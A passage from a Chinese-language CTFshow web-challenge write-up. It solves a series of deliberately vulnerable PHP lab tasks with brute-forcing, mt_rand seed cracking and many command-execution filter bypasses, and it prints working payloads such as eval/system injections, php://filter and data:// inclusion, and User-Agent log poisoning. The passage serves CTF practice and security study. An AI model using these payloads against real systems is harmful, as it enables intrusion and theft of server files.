<pre><code class="highlight plaintext">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</code></pre>
<p>转换过来就是:你赢了，去幺幺零点皮爱吃皮看看</p>
<p><code>110.php</code></p>
<p>直接给了flag</p>
<h3 id="web19"><a class="markdownIt-Anchor" href="#web19"></a> web19</h3>
<pre><code class="highlight plaintext">密钥什么的，就不要放在前端了</code></pre>
<p>看起来像一个密钥泄露嗯。。是flask的SECRET_KEY吗？还是什么。看一眼先</p>
<p>好吧高估了，就是一个判断逻辑放在了前端并且密码和用户都是明文</p>
<p>但是显示密码错误，猜测是放的密码是被加密过的</p>
<p>那么尝试抓包改密码看看这个加密是在前端还是在后端的</p>
<p>结果是前端，直接得到flag</p>
<h3 id="web20"><a class="markdownIt-Anchor" href="#web20"></a> web20</h3>
<pre><code class="highlight plaintext">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</code></pre>
<p>通过了解如果数据库未设置访问权限的话，是可以直接访问 把数据库给下载下来的</p>
<p>尝试通过默认名称<code>database.mdb</code>访问无果，但是扫到了<code>/db</code></p>
<p>但是访问不了，用一下递归扫描，摸到了<code>db.mdb</code></p>
<p>下载到本地用010搜一下关键字就可以</p>
<h2 id="爆破complete"><a class="markdownIt-Anchor" href="#爆破complete"></a> 爆破(Complete)</h2>
<h3 id="web21"><a class="markdownIt-Anchor" href="#web21"></a> web21</h3>
<pre><code class="highlight plaintext">爆破什么的，都是基操</code></pre>
<p>上来就弹是吧?上bp</p>
<p>这里了解一下bp的<strong>Custom iterator</strong>模式</p>
<p>可以将palyload分块处理</p>
<p>比如这题的账号密码其实是以这种方式存在的</p>
<pre><code class="highlight plaintext">base64encode(username:passwd)</code></pre>
<p>并且注入位置在<code>Authorization</code></p>
<p>记得把最后的<code>urlencode</code>给去掉</p>
<h3 id="web23"><a class="markdownIt-Anchor" href="#web23"></a> web23</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;
    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);
    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;
        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;
            <span class="keyword">echo</span> <span class="variable">$flag</span>;
        &#125;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

&#125;
<span class="meta">?&gt;</span></code></pre>
<p>具体要求是这样:</p>
<pre><code class="highlight plaintext">第2位要和第15位相等，第15位要和第18位相等
并且第2位+第15位+第18位/第2位要等于第32位</code></pre>
<pre><code class="highlight php"><span class="comment">#encoding=gbk</span>
import hashlib

def <span class="title function_ invoke__">check</span>(md5str):
    <span class="comment"># 提取对应位置的字符</span>
    c1 = md5str[<span class="number">1</span>]
    c2 = md5str[<span class="number">14</span>]
    c3 = md5str[<span class="number">17</span>]
    c4 = md5str[<span class="number">31</span>]

    <span class="comment"># 条件1：三个字符相等</span>
    <span class="keyword">if</span> c1 != c2 <span class="keyword">or</span> c2 != c3:
        <span class="keyword">return</span> False

    <span class="comment"># 条件2：计算表达式（转 int 前需确保是数字）</span>
    <span class="keyword">if</span> <span class="title function_ invoke__">not</span> (c1.<span class="title function_ invoke__">isdigit</span>() <span class="keyword">and</span> c4.<span class="title function_ invoke__">isdigit</span>()):
        <span class="keyword">return</span> False

    c = <span class="keyword">int</span>(c1)
    <span class="keyword">try</span>:
        result = (c + c + c) / c
    except ZeroDivisionError:
        <span class="keyword">return</span> False

    <span class="keyword">return</span> <span class="keyword">int</span>(result) == <span class="keyword">int</span>(c4)

<span class="comment"># 暴力枚举 token 值</span>
<span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">100000000</span>):
    token = <span class="title function_ invoke__">str</span>(i)
    md5val = hashlib.<span class="title function_ invoke__">md5</span>(token.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()
    <span class="keyword">if</span> <span class="title function_ invoke__">check</span>(md5val):
        <span class="keyword">print</span>(f<span class="string">&quot;[+] 找到符合条件的 token：&#123;token&#125;&quot;</span>)
        <span class="keyword">print</span>(f<span class="string">&quot;    md5: &#123;md5val&#125;&quot;</span>)
        <span class="keyword">break</span>
</code></pre>
<h3 id="web24"><a class="markdownIt-Anchor" href="#web24"></a> web24</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;
    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];
    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);
    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;
        <span class="keyword">echo</span> <span class="variable">$flag</span>;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);
&#125;</code></pre>
<p>一个伪随机数的问题。种子固定，随机值是固定的那几个</p>
<p>自己拿php跑一下这个种子的随机值传参即可</p>
<h3 id="web25"><a class="markdownIt-Anchor" href="#web25"></a> web25</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>


<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;
    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];
    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));
    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());
    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;
        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;
            <span class="keyword">echo</span> <span class="variable">$flag</span>;
        &#125;
    &#125;<span class="keyword">else</span>&#123;
        <span class="keyword">echo</span> <span class="variable">$rand</span>;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);
&#125;
</code></pre>
<p>我们来理一下</p>
<pre><code class="highlight plaintext">1.将flag:MD5编码--&gt;取[0:7]--&gt;作为hex转换成十进制--&gt;作为种子
2.比较token和2*mt_rand()</code></pre>
<p>还是好解决的，因为返回了<code>$rand</code>值，可以逆着推出<code>$mt_rand</code></p>
<p>这里是894610327</p>
<p>使用<code>php_mt_rand</code>工具来破解一下，并结合当前PHP版本得到了合适的种子</p>
<pre><code class="highlight plaintext">1324767434 
2626545208 
3845172103</code></pre>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709152756959.png" alt="image-20250709152756959"></p>
<p>运气不是很好啊。。那只能一个个试过去了</p>
<p>结果都没打出来，何意呢。。重新开了靶机再试，104429216</p>
<pre><code class="highlight plaintext">131270818
2698696663 
3895390800</code></pre>
<p>。？还是出不来，仔细再看一眼</p>
<p>搞错了搞成1+2了原来是2+3啊哈哈。。</p>
<p>最后试出来是第三个</p>
<h3 id="web26"><a class="markdownIt-Anchor" href="#web26"></a> web26</h3>
<p>安装界面直接连接就说连上了。。好怪啊。</p>
<p>找找源码，找到一个<code>checkdb.php</code></p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709160523122.png" alt="image-20250709160523122"></p>
<pre><code class="highlight plaintext">POST：a=&amp;p=&amp;u=&amp;d=&amp;pass=</code></pre>
<p>但是其实抓包抓一下可以直接看到flag的。<img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709161018103.png" alt="image-20250709161018103"></p>
<h3 id="web27"><a class="markdownIt-Anchor" href="#web27"></a> web27</h3>
<p>本来以为是爆破admin的密码爆了半天没收获结果发现是让我爆破人身份证号码。</p>
<pre><code class="highlight plaintext">高先伊
621022********5237</code></pre>
<p>这边爆破一下日期</p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709162357752.png" alt="image-20250709162357752"></p>
<p>爆破了半天得到621022199002015237</p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709165512904.png" alt="image-20250709165512904"></p>
<p>登录就可以拿到flag</p>
<h3 id="web28"><a class="markdownIt-Anchor" href="#web28"></a> web28</h3>
<p>挺邪门的题目，随便改URL的话会显示重定向过多</p>
<p>尝试把最后的去掉，对0和1的位置进行1-100遍历(问就是扫出来是1-100)</p>
<p>这里使用<code>Cluster bomb</code>模式</p>
<p><code>payload type</code>为<code>Numbers</code></p>
<p>对1和2位置都设置1-100</p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709172439403.png" alt="image-20250709172439403"></p>
<h2 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h2>
<p>好玩爱玩，好吃爱吃</p>
<p>喜欢我RCE吗</p>
<h3 id="web29"><a class="markdownIt-Anchor" href="#web29"></a> web29</h3>
<pre><code class="highlight plaintext">&lt;?php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>
<p>简单的绕过</p>
<p><code>\ '' &quot; &quot; `` </code>都可以绕过，加在flag里就行</p>
<pre><code class="highlight plaintext">?c=system(&quot;cat fla\g.php&quot;);</code></pre>
<p>然后看源码注释掉的部分即可</p>
<h3 id="web30"><a class="markdownIt-Anchor" href="#web30"></a> web30</h3>
<pre><code class="highlight plaintext">命令执行，需要严格的过滤</code></pre>
<p>那看来过滤很不严格了</p>
<pre><code class="highlight plaintext">&lt;?php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>
<p>懒得看多出来的过滤，和我的通配符说去吧</p>
<pre><code class="highlight plaintext">?c=passthru(&quot;cat fl*&quot;);</code></pre>
<h3 id="web31"><a class="markdownIt-Anchor" href="#web31"></a> web31</h3>
<pre><code class="highlight plaintext">&lt;?php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>
<p>三种方法：</p>
<ul>
<li>空格替代</li>
</ul>
<pre><code class="highlight plaintext">?c=echo%09`tac%09fl*`;//这边&#123;IFS&#125;出于未知原因是不可用的</code></pre>
<ul>
<li>eval传参</li>
</ul>
<pre><code class="highlight plaintext">?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</code></pre>
<ul>
<li>无参数</li>
</ul>
<pre><code class="highlight plaintext">eval(end(current(get_defined_vars())));&amp;b=system(&#x27;tac fl*&#x27;);
show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>
<h3 id="web32"><a class="markdownIt-Anchor" href="#web32"></a> web32</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>
<p>这里不看过滤字符串(问就是没必要，还没过滤的很死)</p>
<p>看一眼过滤了</p>
<pre><code class="highlight plaintext">. 空格 &#x27; ` ;  (</code></pre>
<p>括号都过滤掉了吗。哈基c你这家伙，但是不影响</p>
<p>这里放弃直接shell的想法，尝试用伪协议作为帮手</p>
<pre><code class="highlight plaintext">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</code></pre>
<p>为什么这个<code>?&gt;</code>可以用呢?</p>
<p>看其他师傅的解释说是<code>?&gt;</code>可以 闭合 php（ ?&gt; 闭合的是 eval 里面的 php 语句，eval 后续还有语句的话，依旧是会执行的。)</p>
<pre><code class="highlight plaintext">具体的来说，对于include
空格是个可有可无的东西，即使没有空格它也能从上下文中判断 $var 是变量，它会优先解析变量，然后再处理语句。
?&gt;这部分在这里也很神必，eval解析php语句，而后面的?&gt;直接被当作了无效文字不被处理，而在?&gt;前的语句不加;是无所谓的</code></pre>
<p>多说无益，自己调一眼看看</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250708105538411.png" alt="image-20250708105538411"></p>
<p>可以看到后面的语句正常执行了</p>
<p>php，很神奇吧。。</p>
<pre><code class="highlight plaintext">base64是什么几把，我直接php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php当懒狗爽赤😋</code></pre>
<h3 id="web33"><a class="markdownIt-Anchor" href="#web33"></a> web33</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>
<pre><code class="highlight plaintext">. 空格 &#x27; ` ; ( &quot;</code></pre>
<p>双引号也没了</p>
<p>但是我前一个好像没用过&quot;&quot;啊。。</p>
<p>秒赤</p>
<h3 id="web34"><a class="markdownIt-Anchor" href="#web34"></a> web34</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>
<pre><code class="highlight plaintext">. 空格 ` &#x27; ; ( : &quot;</code></pre>
<p>木大木大木大！没有实质用处的过滤哒!和上上个凑一桌去</p>
<h3 id="web35"><a class="markdownIt-Anchor" href="#web35"></a> web35</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>
<pre><code class="highlight plaintext">. 空格 &#x27; ` ; ( : &quot; &lt; =</code></pre>
<p>和上上上个一桌</p>
<h3 id="web36"><a class="markdownIt-Anchor" href="#web36"></a> web36</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>
<pre><code class="highlight plaintext">. 空格 &#x27; ` ; ( : &quot; &lt; = / 数字</code></pre>
<p>数字换成字母</p>
<p>然后和上上上上个一桌</p>
<h3 id="web37"><a class="markdownIt-Anchor" href="#web37"></a> web37</h3>
<pre><code class="highlight plaintext">&lt;?php
//flag in flag.php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
        include($c);
        echo $flag;
    
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;</code></pre>
<p>嗯。。这里直接<code>include</code>了，直接伪协议吧</p>
<pre><code class="highlight plaintext">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTsgPz4=</code></pre>
<p>这里base64是<code>&lt;?php system('tac flag.php'); ?&gt;</code></p>
<p>或者其实都能命令执行了你用<code>*</code>偷个懒也没事</p>
<p>这里为什么<code>php://input</code>用谷歌浏览器的hackbar会出现执行不了的情况(因为这啥比post没有=就发不了包)</p>
<p>只有在包手动改才可以</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250708121634882.png" alt="image-20250708121634882"></p>
<p>也可以尝试包含一下日志</p>
<pre><code class="highlight plaintext">nginx 的日志文件 /var/log/nginx/access.log</code></pre>
<p>包含完发现记录了UA头，尝试一下UA头注入</p>
<p><code>User-Agent: &lt;?php system('tac flag.php');?&gt;</code></p>
<p>在/路由下注入再包含就可以看到被执行</p>
<h3 id="web38"><a class="markdownIt-Anchor" href="#web38"></a> web38</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="comment">//flag in flag.php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">include</span>(<span class="variable">$c</span>);
        <span class="keyword">echo</span> <span class="variable">$flag</span>;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>
<p><s>简直说的和你上一题可以用这file一样</s></p>
<p>咳咳，看到过滤了<code>flag php file</code></p>
<p>考虑用data伪协议</p>
<pre><code class="highlight plaintext">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTsgPz4=</code></pre>
<p><code>妈的忘了还有短标签了。</code></p>
<pre><code class="highlight plaintext">?c=data://text/plain,&lt;?=system(&quot;tac fl*&quot;)?&gt;</code></pre>
<p>当然的当然这题用日志包含还是可以做</p>
<h3 id="web39"><a class="markdownIt-Anchor" href="#web39"></a> web39</h3>
<pre><code class="highlight plaintext">&lt;?php
//flag in flag.php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
        include($c.&quot;.php&quot;);
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>
<p>用一个小小的后缀乱我道心吗。。</p>
<pre><code class="highlight plaintext">?c=data://text/plain,&lt;?php system(&#x27;tac fl*&#x27;)?&gt;//
?c=data://text/plain,&lt;?php system(&#x27;tac fl*&#x27;)?&gt;&lt;?php</code></pre>
<p>两种都行，总之闭合把后面的去掉就行</p>
<p>但是其实不去也行，聪明的php会把后面的后缀当成html直接显示</p>
<h3 id="web40"><a class="markdownIt-Anchor" href="#web40"></a> web40</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
        
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>
<p>啊呀！骇死我力</p>
<p>过滤了数字</p>
<pre><code class="highlight plaintext">~ ` @ # $ % ^ &amp; * （ ） - = + &#123; &#125; [ ] : &#x27; &quot; , &lt; . &gt; / ? \</code></pre>
<p>符号基本都用不了了</p>
<p>但是您猜怎么着?哎!他这是个中文输入法的括号</p>
<p>无参数rce伺候</p>
<pre><code class="highlight plaintext">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
?c=session_start();system(session_id());</code></pre>
<h3 id="web41"><a class="markdownIt-Anchor" href="#web41"></a> web41</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>无数字字母rce</p>
<p><code>~ $</code>不给用，自增取反异或都用不了辣</p>
<p>不异或能怎么办呢。。你看这里是不是还有个<code>|</code>可以用</p>
<p>利用或来构造字符即可</p>
<h3 id="web42"><a class="markdownIt-Anchor" href="#web42"></a> web42</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>
<p><strong>解法1</strong>：</p>
<p>利用||管道符的特性</p>
<p><code>如果||左边的命令（command1）未执行成功，那么就执行||右边的命令（command2）；或者换句话说，“如果这个命令执行失败了||那么就执行这个命令。</code></p>
<p><strong>解法2</strong>:</p>
<p>换行来绕过，这个语句本身的意思就是重定向输出表示不回显，(你在反弹shell/提权的时候或许见到过它)</p>
<pre><code class="highlight plaintext">?c=tac flag.php%0a</code></pre>
<p>所以同理只要能分割命令的基本都是没有问题的</p>
<h3 id="web43"><a class="markdownIt-Anchor" href="#web43"></a> web43</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;
